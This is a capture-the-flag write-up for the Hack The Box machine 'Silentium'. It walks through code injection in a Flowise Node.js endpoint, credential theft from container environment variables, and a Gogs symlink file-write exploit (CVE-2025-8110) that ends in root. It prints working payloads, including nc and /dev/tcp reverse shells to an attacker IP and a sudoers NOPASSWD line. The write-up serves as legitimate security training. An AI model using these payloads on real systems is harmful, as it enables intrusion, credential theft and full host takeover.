# **HTB: Silentium - Complete Penetration Testing Writeup**

**OS:** Linux | **Difficulty:** Medium | **Technologies:** Node.js, Flowise, Docker, Gogs

This write-up documents the full attack path for the Hack The Box machine **Silentium**. The attack chain begins with Server-Side Code Injection (Insecure Code Evaluation) in a Node.js backend to compromise a Docker container. From there, we extract host credentials from environment variables, pivot to the host system via SSH, and escalate to root by exploiting an Arbitrary File Write vulnerability (CVE-2025-8110) in a local instance of Gogs.

---

## **Phase 1: Initial Access (Node.js RCE)**

During web enumeration of `staging.silentium.htb`, we interact with an API endpoint (`/api/v1/node-load-method/customMCP`) that evaluates user-supplied input as code. By injecting an Immediately Invoked Function Expression (IIFE), we can force the server to load the `child_process` module and execute a reverse shell.

### **1. Crafting the Payload**
We create a file named `payload.json` containing our reverse shell payload embedded in the `mcpServerConfig` parameter.

In [ ]:
cat > payload.json << 'EOF'
{
  "loadMethod": "listActions",
  "inputs": {
    "mcpServerConfig": "({x:(function(){const cp=process.mainModule.require('child_process');cp.exec('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc <ATTACKER_IP> 4444 >/tmp/f');return 1;})()} )"
  }
}
EOF

### **2. Executing the Exploit**
We set up a Netcat listener (`nc -lvnp 4444`) on our attacking machine and send the payload via `curl`.

In [ ]:
curl -X POST http://staging.silentium.htb/api/v1/node-load-method/customMCP \
     -H "Authorization: Bearer <YOUR_API_KEY>" \
     -H "Content-Type: application/json" \
     -d @payload.json

Upon sending the request, the Node.js backend blindly evaluates the `mcpServerConfig` string, escaping the application logic via `process.mainModule.require`, and executing our system command. We receive a connection back to our listener, landing us inside a Flowise Docker container as the `node` user.

---

## **Phase 2: Pivoting to the Host (`ben`)**

Being trapped inside a Docker container means we need a way to pivot to the main host. A common misconfiguration in Docker environments is passing sensitive host credentials directly into the container's environment variables upon boot.

### **3. Extracting Credentials**
We dump the active memory environment variables to hunt for passwords.

In [ ]:
env | grep -i pass

This command outputs the plaintext password for the local host user `ben`. Since we know SSH is exposed on the target host from our initial Nmap scans, we can use these credentials to establish a secure session on the main server.

In [ ]:
ssh ben@silentium.htb
cat /home/ben/user.txt

---

## **Phase 3: Privilege Escalation (`root`)**

Operating as `ben`, we perform internal system enumeration to find services hidden from the public internet.

### **4. Internal Service Enumeration**
We use `ss` to find listening ports and `ps` to identify the processes attached to them.

In [ ]:
ss -tuln
ps aux | grep gogs

We discover a local Gogs Git service running on port `3000`. Crucially, the `ps aux` output reveals that the Gogs web service was started by, and is currently running as, the `root` user. This makes it a prime target for privilege escalation.

### **5. Port Forwarding the Target**
To interact with the Gogs web interface from our attacking machine, we set up an SSH local port forward.

In [ ]:
ssh -L 8080:127.0.0.1:3000 ben@silentium.htb

### **6. Exploiting Gogs (CVE-2025-8110)**
Gogs is vulnerable to CVE-2025-8110, an Arbitrary File Write flaw caused by improper handling of symbolic links (symlinks) via its API. By creating a symlink in a repository that points to a sensitive file on the host (like `.git/config` or `/etc/sudoers.d/ben`), pushing it to the server, and then updating the file via the web API, Gogs will unsafely follow the shortcut and overwrite the target file on the OS.

Because Gogs runs as `root`, it has the authority to write anywhere.

#### **Vulnerability Flow Mapping**
Here is the logical breakdown of how the exploit functions across the two primary phases:

**Phase 1: The Setup (Planting the Symlink Trap)**
```text
[ Attacker's Machine ]
         │
         ├─ 1. Creates Symlink: `ln -s /etc/sudoers.d/ben malicious_link`
         │
         ├─ 2. Commits File: Git records the file as a shortcut, NOT the file contents.
         │
         ▼
[ Git Push ] ─────────────────────────┐
                                      │
                                      ▼
                             [ Gogs Server (Host OS) ]
                                      │
                                      └─ 3. Receives push and stores `malicious_link` 
                                            in its local repository folder.
                                            (The trap is now set on the hard drive).
```

**Phase 2: Payload Delivery (Triggering the Flaw)**
```text
[ Attacker's Machine ]
         │
         └─ 1. API Request: Sends HTTP PUT request to Gogs API.
               Action: "Update the file named 'malicious_link'."
               Payload: "ben ALL=(ALL) NOPASSWD: ALL"
         │
         ▼
[ Gogs Web API ] (Running as 'root')
         │
         ├─ 2. Flaw Triggered: Gogs fails to check if the file is a symlink.
         │
         ├─ 3. File Operation: Gogs tells the OS to open 'malicious_link' 
         │                     and write the new payload inside it.
         │
         ▼
[ Host Operating System ]
         │
         ├─ 4. OS Level: The OS sees 'malicious_link' is a shortcut.
         │               It automatically follows the path it points to.
         │
         ├─ 5. Redirect: malicious_link ───> /etc/sudoers.d/ben
         │
         ▼
[ System Configuration ]
         │
         └─ 6. Arbitrary Write: The payload is written directly into 
                                /etc/sudoers.d/ben as the 'root' user.
                                (Privilege Escalation Achieved).
```

**Exploitation Steps:**
1. Open a browser to `http://127.0.0.1:8080`.
2. Register a new user account (e.g., `hacker` / `Password123!`).
3. Navigate to User Settings > Applications and generate a new API Token.
4. Start a Netcat listener (`nc -lvnp 4445`) on the attacking machine.
5. Execute the **TYehan Python Exploit Script**, which automates the repository creation, symlink poisoning, and API `PUT` request.

In [ ]:
python3 silentium_exploit.py -u http://127.0.0.1:8080 -un hacker -pw Password123! -t <YOUR_API_TOKEN> -lh <ATTACKER_IP> -lp 4445

The script clones a new repo, creates a symlink pointing to `.git/config`, pushes it, and then uses the Gogs API to overwrite the file. The payload injects a malicious `sshCommand = bash -c 'bash -i >& /dev/tcp/<IP>/4445 0>&1' #` into the configuration. When Gogs interacts with the repository, the injected configuration executes our reverse shell as `root`.

### **7. Capturing the Root Flag**
We catch the incoming shell on our listener.

In [ ]:
id
# uid=0(root) gid=0(root) groups=0(root)

cat /root/root.txt

---

## **Summary: Complete Command Tally**

Here is a quick reference guide containing the terminal commands executed throughout this walkthrough:

| # | Phase | Command |
| --- | --- | --- |
| 1 | Initial Access Prep | `cat > payload.json << 'EOF'...` |
| 2 | Initial Access | `nc -lvnp 4444` |
| 3 | Initial Access | `curl -X POST http://staging.silentium.htb/api/v1/node-load-method/customMCP...` |
| 4 | Container Escape | `env \| grep -i pass` |
| 5 | Pivot to Host | `ssh ben@silentium.htb` |
| 6 | User Flag | `cat /home/ben/user.txt` |
| 7 | PrivEsc Enum | `ss -tuln` |
| 8 | PrivEsc Enum | `ps aux \| grep gogs` |
| 9 | Port Forwarding | `ssh -L 8080:127.0.0.1:3000 ben@silentium.htb` |
| 10 | Catching Root | `nc -lvnp 4445` |
| 11 | Gogs Exploit | `python3 silentium_exploit.py -u http://127.0.0.1:8080 -un <USER> -pw <PASS> -t <TOKEN>...` |
| 12 | Root Flag | `cat /root/root.txt` |